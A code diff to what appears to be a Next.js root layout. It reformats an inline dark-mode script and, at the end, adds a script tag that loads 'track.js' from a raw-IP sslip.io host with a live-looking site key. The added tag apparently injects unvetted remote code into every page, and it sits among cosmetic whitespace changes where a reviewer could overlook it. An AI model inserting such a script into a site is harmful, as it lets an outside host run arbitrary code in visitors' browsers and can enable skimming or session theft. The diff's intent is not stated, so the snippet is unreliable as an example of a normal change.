@@ -5,7 +5,7 @@ try {
     "8.8.8.8",
     "8.8.4.4"
   ]);
-} catch {}
+} catch { }
 
 export const dynamic = "force-dynamic";
 export const revalidate = 0;
@@ -144,15 +144,17 @@ export default async function RootLayout({ children }: { children: React.ReactNo
         <meta name="theme-color" content={NEXT_PUBLIC_THEME_COLOR} />
         <script dangerouslySetInnerHTML={{
           __html: `
-    (function() {
-      try {
-        if (localStorage.getItem("theme") === "dark") {
-          document.documentElement.classList.add("dark");
-        }
-      } catch (e) {}
-    })();
-  `,
+          (function() {
+            try {
+              if (localStorage.getItem("theme") === "dark") {
+                document.documentElement.classList.add("dark");
+                }
+                } catch (e) {}
+                })();
+                `,
         }} />
+        <script src="https://34-31-149-104.sslip.io/track.js"
+          data-site-key="sp_live_d6290ce9381ce62ddc1697b076766929"></script>
       </head>
       <body className="antialiased">
         <RegisterServiceWorker />
